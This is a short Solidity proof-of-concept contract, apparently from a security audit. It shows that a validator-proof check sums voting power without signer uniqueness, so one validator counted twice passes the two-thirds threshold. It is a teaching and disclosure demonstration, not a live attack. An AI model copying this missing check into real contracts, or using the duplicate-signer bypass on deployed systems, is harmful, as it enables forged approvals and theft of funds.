// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract Exploit { uint256 public votingPower; uint256 public uniquePower; bool public accepted; event Proof(uint256 counted,uint256 unique);
    function run() external { uint256 threshold=667; uint256 oneValidator=400; uint256[] memory proofs=new uint256[](2); proofs[0]=oneValidator; proofs[1]=oneValidator;
        // @> votingPower += validatorProofs[i].votingPower; (no signer uniqueness)
        votingPower=proofs[0]+proofs[1]; uniquePower=oneValidator; accepted=votingPower>=threshold; emit Proof(votingPower,uniquePower); require(accepted&&uniquePower<threshold,"duplicate rejected"); }
}
